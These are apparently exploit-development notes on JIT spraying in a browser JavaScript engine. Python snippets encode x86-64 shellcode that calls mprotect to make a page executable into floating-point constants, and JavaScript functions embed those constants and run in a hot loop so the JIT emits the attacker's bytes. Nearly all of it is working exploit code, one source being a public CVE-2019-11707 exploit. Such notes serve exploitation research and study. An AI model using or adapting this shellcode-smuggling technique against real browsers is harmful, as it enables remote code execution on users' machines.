## bag of consts
This method encodes gadgets in double constants. Each gadget can only be 8-2 in size, because you need to jump over the original code blocks. This method works, but we can do better.
source: https://github.com/vigneshsrao/CVE-2019-11707/blob/master/exploit.js

```python
'''
   0xeba2e67eb8e:       movabs r11,0x2121454d444e4946
   0xeba2e67eb98:       mov    QWORD PTR [rbp-0x50],r11
   0xeba2e67eb9c:       movabs r11,0x48cccccccccccccc
   0xeba2e67eba6:       mov    QWORD PTR [rbp-0x58],r11
   0xeba2e67ebaa:       movabs r11,0x90909005eb087a8b
   tl;dr, we control 8 out of every 14 bytes
'''

shellcode  = b"FINDME!!"
shellcode += asm(f"""
inst0:
    {"int3" if DEBUG else "nop"}
    mov rdi, [rdx+8]
    jmp $+0x09
    nop

inst1:
    mov esi, 0x1000
    jmp $+0x09
    nop

inst2:
    mov edx, 7
    jmp $+0x09
    nop

inst3:
    mov eax, SYS_mprotect
    syscall
    ret
""")

print(disasm(shellcode[8:]))

# pad shellcode to 8 byte alignment
shellcode += b"\x90"*(8 - len(shellcode) % 8)

print(shellcode)
for i in range(0, len(shellcode), 8):
    val = struct.unpack("<d", shellcode[i:i+8])[0]
    idx = i // 8
    print(f"    const lmao{idx} = {val};")
```

```javascript
// This function takes arg1 (big int) and mprotects the page to RWX
function jitme(arg1) {
    const lmao0 = 4.220873660831144e-149;
    const lmao1 = -1.9257503538222773e-231;
    const lmao2 = -1.9257399376165585e-231;
    const lmao3 = -1.9257399373171306e-231;
    const lmao4 = -740933398167895.0;
    const lmao5 = -6.828527034422786e-229;
    return arg1;
}
```

## Directly return consts
This approach is much nicer, does not require gaps in between code. The only remaining problem is const folding, but for a shellcode this small that's not an issue.
```python
DEBUG = False
shellcode  = b"FINDME1!"
shellcode += b"FINDME2!"
shellcode += asm(f"""
inst0:
    {"int3" if DEBUG else "nop"}
    mov rdi, [rdx+8]
    mov esi, 0x1000
    mov edx, 7
    mov eax, SYS_mprotect
    syscall
    ret
""")
shellcode += b"\x90"*(8 - len(shellcode) % 8)
print("const shellcode2 = (x) => [", end='')
for i in range(0, len(shellcode), 8):
    val = struct.unpack("<d", shellcode[i:i+8])[0]
    idx = i // 8
    print(f"{val}, ", end='')
print("];")
```

```javascript
const jitme = (x) => [8.441747321662288e-149, 8.930537139822224e-149, 1.3479969217055813e-231, -5.877471923286753e-39, -6.272466154045844e-228, ];
const egg1 = jitme(0n)[0];
const egg2 = jitme(0n)[1];

for (let i = 0n; i < 100000n; i+=1n) {
    jitme(x);
}
```

source: https://www.youtube.com/watch?v=L7aiFKDg0Jk (explained in the jscript part, but seems to work fine in firefox)
